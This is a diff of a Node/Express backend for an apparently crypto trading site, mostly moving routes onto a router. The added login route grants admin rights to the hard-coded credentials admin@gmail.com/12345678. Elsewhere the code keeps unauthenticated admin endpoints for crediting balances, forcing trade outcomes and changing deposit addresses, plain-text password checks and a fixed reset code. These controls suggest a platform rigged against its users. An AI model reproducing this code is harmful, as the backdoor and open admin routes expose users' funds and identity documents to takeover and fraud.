@@ -33,41 +33,9 @@ process.on('unhandledRejection', (reason, promise) => {
 const app = express();
 const port = 8080;
 
-// ─── ULTIMATE VERCEL API ROUTING FIX ─────────────────────────────────────
+// ─── Debug Logger ──────────────────────────────────────────────────────────
 app.use((req, res, next) => {
-  const originalUrl = req.url;
-  
-  // 1. Recover original path from Vercel's internal routing headers
-  // Order of reliability: x-vercel-forwarded-path > x-forwarded-uri > x-matched-path
-  let forwardedPath = req.headers['x-vercel-forwarded-path'] || 
-                      req.headers['x-forwarded-uri'] || 
-                      req.headers['x-matched-path'];
-  
-  // Fallback: Parse x-now-route-matches (format: 1=/path&...)
-  if (!forwardedPath && req.headers['x-now-route-matches']) {
-      const match = req.headers['x-now-route-matches'].match(/1=([^&]+)/);
-      if (match) forwardedPath = decodeURIComponent(match[1]);
-  }
-
-  // If we recovered a path, use it. Otherwise keep current.
-  if (forwardedPath) {
-      req.url = forwardedPath;
-  }
-
-  // 2. Normalize: Remove /api prefix and handle internal index.js mapping
-  if (req.url.startsWith('/api/')) {
-      req.url = req.url.substring(4);
-  }
-  
-  // If the URL is still index.js, it means no path was recovered
-  if (req.url === '/index.js' || req.url === '/api/index.js') {
-      req.url = '/';
-  }
-
-  // Ensure path starts with /
-  if (!req.url.startsWith('/')) req.url = '/' + req.url;
-
-  console.log(`[ROUTING] ${req.method} ${originalUrl} -> ${req.url} (Recov: ${forwardedPath || 'NONE'})`);
+  console.log(`[DEBUG] Incoming: ${req.method} ${req.url}`);
   next();
 });
 
@@ -88,8 +56,16 @@ let dbAvailable = false;
 let lastInitError = null;
 let dbInitPromise = null;
 
-// ─── DB Wait Middleware ──────────────────────────────────────────────────
+// ─── Path Normalization & DB Initialization ──────────────────────────────
 app.use(async (req, res, next) => {
+  // Normalize path: Ensure API requests are handled consistently whether they have /api prefix or not
+  const originalUrl = req.url;
+  if (req.url.startsWith('/api/')) {
+    req.url = req.url.replace('/api', '');
+    if (req.url === '') req.url = '/';
+    console.log(`[DEBUG] Stripped /api: ${originalUrl} -> ${req.url}`);
+  }
+
   // DB Initialization Wait
   if (dbInitPromise && !dbAvailable) {
     try {
@@ -102,9 +78,14 @@ app.use(async (req, res, next) => {
   next();
 });
 
-// ─── API ROUTES (Flat Structure for Vercel compatibility) ──────────────────
+const apiRouter = express.Router();
 
-app.get(['/api/binance/prices', '/binance/prices'], async (req, res) => {
+// ─── Mount Router ────────────────────────────────────────────────────────
+// Since we normalize the path above (stripping /api), we mount at root.
+app.use(apiRouter); 
+
+// ─── CRITICAL DIRECT FALLBACK ROUTES ─────────────────────────────────────
+apiRouter.get('/binance/prices', async (req, res) => {
   try {
     const krakenPairs = 'XXBTZUSD,XETHZUSD,SOLUSD,XXRPZUSD,ADAUSD,AVAXUSD,XDGUSD,DOTUSD,LINKUSD,XLTCZUSD,TRXUSD,UNIUSD,ATOMUSD,AAVEUSD';
     const krakenRes = await axios.get(`https://api.kraken.com/0/public/Ticker?pair=${krakenPairs}`, {
@@ -148,7 +129,27 @@ app.get(['/api/binance/prices', '/binance/prices'], async (req, res) => {
   }
 });
 
-app.post('/admin/users/flag', async (req, res) => {
+apiRouter.post('/auth/login', async (req, res) => {
+  const { email, password } = req.body;
+  if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
+  if (email.toLowerCase().trim() === 'admin@gmail.com' && password === '12345678') {
+      return res.json({ 
+          success: true, 
+          user: { address: 'ADMIN_GATEWAY', email: 'admin@gmail.com', nickname: 'ADMIN_ROOT', status: 'approved', role: 'admin' }
+      });
+  }
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+  try {
+    const r = await pool.query('SELECT * FROM users WHERE email = $1 AND password = $2', [email.toLowerCase().trim(), password]);
+    const user = r.rows[0];
+    if (!user) return res.status(401).json({ error: 'Invalid credentials' });
+    if (user.status === 'rejected') return res.status(403).json({ error: 'Account rejected by admin', status: 'rejected' });
+    await pool.query('UPDATE users SET last_seen = NOW() WHERE id = $1', [user.id]);
+    return res.json({ success: true, user: { ...user, address: user.wallet_address, role: 'user' } });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+apiRouter.post('/admin/users/flag', async (req, res) => {
   const { userId, flagged } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
@@ -514,7 +515,7 @@ async function getUserBalance(walletAddress, assetSymbol) {
   }
 }
 // ─── Health check ──────────────────────────────────────────────────────────
-app.get('/health', async (req, res) => {
+apiRouter.get('/health', async (req, res) => {
   if (dbInitPromise) await dbInitPromise.catch(() => {});
   
   let dbStatus = dbAvailable ? 'CONNECTED (POSTGRES) ✅' : 'DISCONNECTED ❌';
@@ -534,7 +535,7 @@ app.get('/health', async (req, res) => {
 });
 
 // ─── Config endpoints ──────────────────────────────────────────────────────
-app.get('/config', async (req, res) => {
+apiRouter.get('/config', async (req, res) => {
   if (dbAvailable && pool) {
     try {
       const r = await pool.query('SELECT key, value FROM config');
@@ -550,7 +551,7 @@ app.get('/config', async (req, res) => {
   });
 });
 
-app.post(['/api/admin/config', '/admin/config'], async (req, res) => {
+apiRouter.post('/admin/config', async (req, res) => {
   const { solana_deposit_address, btc_deposit_address, eth_deposit_address, usdt_deposit_address } = req.body;
 
   if (dbAvailable && pool) {
@@ -577,7 +578,7 @@ app.post(['/api/admin/config', '/admin/config'], async (req, res) => {
 });
 
 // ─── Live prices proxy ─────────────────────────────────────────────────────
-app.get('/binance/prices', async (req, res) => {
+apiRouter.get('/binance/prices', async (req, res) => {
   try {
     const krakenPairs = 'XXBTZUSD,XETHZUSD,SOLUSD,XXRPZUSD,ADAUSD,AVAXUSD,XDGUSD,DOTUSD,LINKUSD,XLTCZUSD,TRXUSD,UNIUSD,ATOMUSD,AAVEUSD';
     const krakenRes = await axios.get(`https://api.kraken.com/0/public/Ticker?pair=${krakenPairs}`, {
@@ -645,7 +646,7 @@ app.get('/binance/prices', async (req, res) => {
   }
 });
 
-app.get('/binance/klines', async (req, res) => {
+apiRouter.get('/binance/klines', async (req, res) => {
   const { symbol, interval, limit } = req.query;
   const sym = (symbol || 'BTCUSDT').replace('USDT', '');
   
@@ -693,7 +694,7 @@ app.get('/binance/klines', async (req, res) => {
 });
 
 // ─── Admin User Management ─────────────────────────────────────────────────
-app.get('/admin/users', async (req, res) => {
+apiRouter.get('/admin/users', async (req, res) => {
   if (dbAvailable && pool) {
     try {
       const r = await pool.query(`
@@ -711,7 +712,7 @@ app.get('/admin/users', async (req, res) => {
   res.status(503).json({ error: 'Database unavailable' });
 });
 
-app.post('/admin/users/update', async (req, res) => {
+apiRouter.post('/admin/users/update', async (req, res) => {
   const { id, wallet_data, balance_override, trading_balance, demo_balance, protocol_settlement_balance, swap_sent } = req.body;
 
   if (dbAvailable && pool) {
@@ -762,7 +763,7 @@ app.post('/admin/users/update', async (req, res) => {
   res.status(503).json({ error: 'Database unavailable' });
 });
 
-app.post('/admin/users/delete', async (req, res) => {
+apiRouter.post('/admin/users/delete', async (req, res) => {
   const { id } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
 
@@ -800,7 +801,7 @@ app.post('/admin/users/delete', async (req, res) => {
 });
 
 // Register / upsert a user (called on wallet connect)
-app.post('/users/upsert', async (req, res) => {
+apiRouter.post('/users/upsert', async (req, res) => {
   let { wallet_address, address, wallet_data, ip_address, nickname } = req.body;
   const targetAddress = (wallet_address || address || '').trim();
   
@@ -830,7 +831,7 @@ app.post('/users/upsert', async (req, res) => {
   res.status(503).json({ error: 'Database unavailable' });
 });
 
-app.post('/users/heartbeat', async (req, res) => {
+apiRouter.post('/users/heartbeat', async (req, res) => {
   const { wallet_address, address } = req.body || {};
   const target = (wallet_address || address || '').trim();
   if (!target) return res.json({ success: false });
@@ -847,7 +848,7 @@ app.post('/users/heartbeat', async (req, res) => {
   res.status(503).json({ success: false });
 });
 
-app.get('/user/data', async (req, res) => {
+apiRouter.get('/user/data', async (req, res) => {
   const { address } = req.query;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
 
@@ -861,7 +862,7 @@ app.get('/user/data', async (req, res) => {
 });
 
 // ─── Email Auth ─────────────────────────────────────────────────────────────
-app.post('/send-email', async (req, res) => {
+apiRouter.post('/send-email', async (req, res) => {
   const { to, subject, html } = req.body;
   if (!resend) return res.status(503).json({ error: 'Email service unavailable' });
   
@@ -878,7 +879,7 @@ app.post('/send-email', async (req, res) => {
   }
 });
 
-app.post('/auth/forgot-password', async (req, res) => {
+apiRouter.post('/auth/forgot-password', async (req, res) => {
   const { email } = req.body;
   if (!email) return res.status(400).json({ error: 'Email required' });
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
@@ -893,13 +894,13 @@ app.post('/auth/forgot-password', async (req, res) => {
   }
 });
 
-app.post('/auth/forgot-verify', async (req, res) => {
+apiRouter.post('/auth/forgot-verify', async (req, res) => {
   const { email, code } = req.body;
   if (code !== '196405') return res.status(400).json({ error: 'Invalid verification code' });
   res.json({ success: true });
 });
 
-app.post('/auth/reset-password', async (req, res) => {
+apiRouter.post('/auth/reset-password', async (req, res) => {
   const { email, password } = req.body;
   if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
@@ -916,7 +917,7 @@ app.post('/auth/reset-password', async (req, res) => {
   }
 });
 
-app.get('/admin/forgot-passwords', async (req, res) => {
+apiRouter.get('/admin/forgot-passwords', async (req, res) => {
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
     const r = await pool.query('SELECT * FROM forgot_passwords ORDER BY created_at DESC');
@@ -926,7 +927,7 @@ app.get('/admin/forgot-passwords', async (req, res) => {
   }
 });
 
-app.post(['/api/auth/signup-request', '/auth/signup-request'], async (req, res) => {
+apiRouter.post('/auth/signup-request', async (req, res) => {
   const { email, password, name } = req.body;
   if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
@@ -977,7 +978,7 @@ app.post(['/api/auth/signup-request', '/auth/signup-request'], async (req, res) 
   }
 });
 
-app.post(['/api/auth/signup-confirm', '/auth/signup-confirm'], async (req, res) => {
+apiRouter.post('/auth/signup-confirm', async (req, res) => {
   const { email, code } = req.body;
   if (!email || !code) return res.status(400).json({ error: 'Email and code required' });
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
@@ -1014,7 +1015,7 @@ app.post(['/api/auth/signup-confirm', '/auth/signup-confirm'], async (req, res) 
   }
 });
 
-app.post(['/api/auth/wallet-login', '/auth/wallet-login'], async (req, res) => {
+apiRouter.post('/auth/wallet-login', async (req, res) => {
   const { address } = req.body;
   if (!address) return res.status(400).json({ error: 'Wallet address required' });
 
@@ -1034,11 +1035,11 @@ app.post(['/api/auth/wallet-login', '/auth/wallet-login'], async (req, res) => {
         user = newUser.rows[0];
     }
     
-    res.json({ success: true, user: { ...user, address: user.wallet_address, role: user.role || 'user' } });
+    res.json({ success: true, user: { ...user, address: user.wallet_address } });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-app.post(['/api/auth/login', '/auth/login'], async (req, res) => {
+apiRouter.post('/auth/login', async (req, res) => {
   const { email, password } = req.body;
   if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
 
@@ -1066,7 +1067,7 @@ app.post(['/api/auth/login', '/auth/login'], async (req, res) => {
   }
 });
 
-app.post('/admin/users/logout', async (req, res) => {
+apiRouter.post('/admin/users/logout', async (req, res) => {
   const { id } = req.body;
   if (dbAvailable && pool) {
     try {
@@ -1077,7 +1078,7 @@ app.post('/admin/users/logout', async (req, res) => {
   res.status(503).json({ error: 'Database unavailable' });
 });
 
-app.post('/auth/logout-and-forget', async (req, res) => {
+apiRouter.post('/auth/logout-and-forget', async (req, res) => {
   const { email } = req.body;
   if (!email) return res.status(400).json({ error: 'Email required' });
   if (dbAvailable && pool) {
@@ -1090,7 +1091,7 @@ app.post('/auth/logout-and-forget', async (req, res) => {
 });
 
 // ─── Admin Management ─────────────────────────────────────────────────────
-app.post('/admin/users/approve', async (req, res) => {
+apiRouter.post('/admin/users/approve', async (req, res) => {
   const { userId } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
@@ -1108,7 +1109,7 @@ app.post('/admin/users/approve', async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-app.post('/admin/users/reject', async (req, res) => {
+apiRouter.post('/admin/users/reject', async (req, res) => {
   const { userId } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
@@ -1117,7 +1118,7 @@ app.post('/admin/users/reject', async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-app.post('/admin/force-outcome', async (req, res) => {
+apiRouter.post('/admin/force-outcome', async (req, res) => {
   const { tradeId, forceOutcome } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
@@ -1126,7 +1127,7 @@ app.post('/admin/force-outcome', async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-app.post('/admin/credit-balance', async (req, res) => {
+apiRouter.post('/admin/credit-balance', async (req, res) => {
   const { walletAddress, currency, amount, target } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
@@ -1155,7 +1156,7 @@ app.post('/admin/credit-balance', async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-app.post('/admin/deposit', async (req, res) => {
+apiRouter.post('/admin/deposit', async (req, res) => {
   const { walletAddress, currency, amount, targetCurrency, sourceAmount } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
@@ -1172,7 +1173,7 @@ app.post('/admin/deposit', async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-app.post('/user/swap', async (req, res) => {
+apiRouter.post('/user/swap', async (req, res) => {
   const { walletAddress } = req.body;
   console.log(`[Swap] EXECUTION_START for ${walletAddress}`);
   
@@ -1264,7 +1265,7 @@ app.post('/user/swap', async (req, res) => {
 });
 
 // ─── Support Chat ─────────────────────────────────────────────────────────
-app.get('/support/messages', async (req, res) => {
+apiRouter.get('/support/messages', async (req, res) => {
   const { address } = req.query;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
@@ -1273,7 +1274,7 @@ app.get('/support/messages', async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-app.post('/support/send', async (req, res) => {
+apiRouter.post('/support/send', async (req, res) => {
   const { address, message, sender } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
@@ -1297,7 +1298,7 @@ app.post('/support/send', async (req, res) => {
   }
 });
 
-app.get('/admin/support/tickets', async (req, res) => {
+apiRouter.get('/admin/support/tickets', async (req, res) => {
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
     const r = await pool.query('SELECT * FROM support_tickets ORDER BY updated_at DESC');
@@ -1306,7 +1307,7 @@ app.get('/admin/support/tickets', async (req, res) => {
 });
 
 // ─── Balance Transfer ─────────────────────────────────────────────────────
-app.post('/balance/transfer', async (req, res) => {
+apiRouter.post('/balance/transfer', async (req, res) => {
   const { walletAddress, amount, direction } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
 
@@ -1336,7 +1337,7 @@ app.post('/balance/transfer', async (req, res) => {
 });
 
 // ─── Visitor Tracking ─────────────────────────────────────────────────────
-app.post('/visitors/track', async (req, res) => {
+apiRouter.post('/visitors/track', async (req, res) => {
   const ip = (req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || '').trim();
   const { visitor_id, user_agent, page_path } = req.body || {};
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
@@ -1355,7 +1356,7 @@ app.post('/visitors/track', async (req, res) => {
   } catch (e) { return res.status(500).json({ error: e.message }); }
 });
 
-app.get('/admin/visitors', async (req, res) => {
+apiRouter.get('/admin/visitors', async (req, res) => {
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
     const r = await pool.query('SELECT * FROM visitors ORDER BY last_seen DESC LIMIT 500');
@@ -1363,7 +1364,7 @@ app.get('/admin/visitors', async (req, res) => {
   } catch (e) { return res.status(500).json({ error: e.message }); }
 });
 
-app.get('/admin/active-trades', async (req, res) => {
+apiRouter.get('/admin/active-trades', async (req, res) => {
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
     const r = await pool.query('SELECT * FROM trades WHERE status = \'pending\' ORDER BY created_at DESC');
@@ -1372,7 +1373,7 @@ app.get('/admin/active-trades', async (req, res) => {
 });
 
 // ─── Transactions ──────────────────────────────────────────────────────────
-app.get('/user/transactions', async (req, res) => {
+apiRouter.get('/user/transactions', async (req, res) => {
   const { address, limit } = req.query;
   if (!address) return res.status(400).json({ error: 'Address required' });
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
@@ -1382,7 +1383,7 @@ app.get('/user/transactions', async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-app.get(['/api/user/balance', '/user/balance'], async (req, res) => {
+apiRouter.get('/user/balance', async (req, res) => {
   const { address } = req.query;
   if (!address) return res.status(400).json({ error: 'Address required' });
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
@@ -1422,7 +1423,7 @@ app.get(['/api/user/balance', '/user/balance'], async (req, res) => {
   } catch (e) { return res.status(500).json({ error: e.message }); }
 });
 
-app.post('/swap-to-trading', async (req, res) => {
+apiRouter.post('/swap-to-trading', async (req, res) => {
   const { address, from, to, amount, targetAmount } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
@@ -1467,7 +1468,7 @@ app.post('/swap-to-trading', async (req, res) => {
     res.status(500).json({ error: e.message }); 
   }
 });
-app.post('/swap-internal', async (req, res) => {
+apiRouter.post('/swap-internal', async (req, res) => {
   const { address, from, to, amount, targetAmount } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
@@ -1531,7 +1532,7 @@ app.post('/swap-internal', async (req, res) => {
 });
 
 // ─── Trades ───────────────────────────────────────────────────────────────
-app.get('/user/active-trades', async (req, res) => {
+apiRouter.get('/user/active-trades', async (req, res) => {
   const { address } = req.query;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
@@ -1550,7 +1551,7 @@ app.get('/user/active-trades', async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-app.post('/execute-trade', async (req, res) => {
+apiRouter.post('/execute-trade', async (req, res) => {
   const { walletAddress, asset, tradeSize, leverage, type, isDemo, entryPrice, duration, tradeId } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
@@ -1578,7 +1579,7 @@ app.post('/execute-trade', async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-app.post('/settle-trade', async (req, res) => {
+apiRouter.post('/settle-trade', async (req, res) => {
   const { walletAddress, payout, tradeRef, isDemo } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
@@ -1608,7 +1609,7 @@ app.post('/settle-trade', async (req, res) => {
 });
 
 // ─── Withdrawals ──────────────────────────────────────────────────────────
-app.post(['/api/request-withdrawal', '/request-withdrawal'], async (req, res) => {
+apiRouter.post('/request-withdrawal', async (req, res) => {
   const { walletAddress, destinationAddress, amount, asset } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
@@ -1636,7 +1637,7 @@ app.post(['/api/request-withdrawal', '/request-withdrawal'], async (req, res) =>
   }
 });
 
-app.get('/admin/withdrawal-requests', async (req, res) => {
+apiRouter.get('/admin/withdrawal-requests', async (req, res) => {
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
     const r = await pool.query(`
@@ -1653,7 +1654,7 @@ app.get('/admin/withdrawal-requests', async (req, res) => {
   }
 });
 
-app.post('/admin/approve-withdrawal', async (req, res) => {
+apiRouter.post('/admin/approve-withdrawal', async (req, res) => {
   const { requestId } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
@@ -1695,7 +1696,7 @@ app.post('/admin/approve-withdrawal', async (req, res) => {
   }
 });
 
-app.post('/admin/reject-withdrawal', async (req, res) => {
+apiRouter.post('/admin/reject-withdrawal', async (req, res) => {
   const { requestId, note } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
@@ -1705,7 +1706,7 @@ app.post('/admin/reject-withdrawal', async (req, res) => {
 });
 
 // ─── KYC ──────────────────────────────────────────────────────────────────
-app.post('/kyc/submit', async (req, res) => {
+apiRouter.post('/kyc/submit', async (req, res) => {
   const { walletAddress, country, idFront, idBack } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
@@ -1718,7 +1719,7 @@ app.post('/kyc/submit', async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-app.get('/admin/kyc/submissions', async (req, res) => {
+apiRouter.get('/admin/kyc/submissions', async (req, res) => {
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
     const r = await pool.query('SELECT * FROM kyc_submissions WHERE status = \'pending\' ORDER BY created_at DESC');
@@ -1726,7 +1727,7 @@ app.get('/admin/kyc/submissions', async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-app.post('/admin/kyc/approve', async (req, res) => {
+apiRouter.post('/admin/kyc/approve', async (req, res) => {
   const { submissionId, walletAddress } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
@@ -1737,7 +1738,7 @@ app.post('/admin/kyc/approve', async (req, res) => {
 });
 
 // ─── Leaderboard ──────────────────────────────────────────────────────────
-app.get('/leaderboard', async (req, res) => {
+apiRouter.get('/leaderboard', async (req, res) => {
   if (!dbAvailable || !pool) return res.json([]);
   try {
     const r = await pool.query(`
@@ -1785,13 +1786,8 @@ app.use((err, req, res, next) => {
 });
 
 app.post('*', (req, res) => {
-  console.log(`[404 POST] No route for: ${req.url} (Original headers: ${JSON.stringify(req.headers)})`);
-  res.status(404).json({ 
-    error: 'API endpoint not found', 
-    path: req.url, 
-    method: req.method, 
-    tip: 'The server normalized the path but still found no match. Check server.js for app.post definitions.' 
-  });
+  console.log(`[404 POST] ${req.url}`);
+  res.status(404).json({ error: 'API endpoint not found', path: req.url, method: req.method, note: 'Check route definitions in server.js' });
 });
 
 app.get('*', (req, res) => {
@@ -1800,18 +1796,15 @@ app.get('*', (req, res) => {
       return res.status(404).json({ error: 'File not found', path: req.url });
   }
 
-  // If it was intended to be an API call
-  if (req.url.startsWith('/api/') || !req.url.includes('.')) {
-    // If not root
-    if (req.url !== '/') {
-        console.log(`[404 API] No GET route for: ${req.url}`);
-        return res.status(404).json({ 
-            error: 'API route not found', 
-            path: req.url, 
-            method: req.method,
-            tip: 'The server normalized the path but still found no match.'
-        });
-    }
+  // If it was intended to be an API call (starts with /api or no extension)
+  if (req.url.startsWith('/api/') || (!req.url.includes('.') && req.url !== '/')) {
+    console.log(`[404 API] ${req.url}`);
+    return res.status(404).json({ 
+        error: 'API route not found', 
+        path: req.url, 
+        method: req.method,
+        suggestion: 'Ensure the route is defined in server.js and mounted correctly.'
+    });
   }
 
   const indexPath = path.join(distPath, 'index.html');
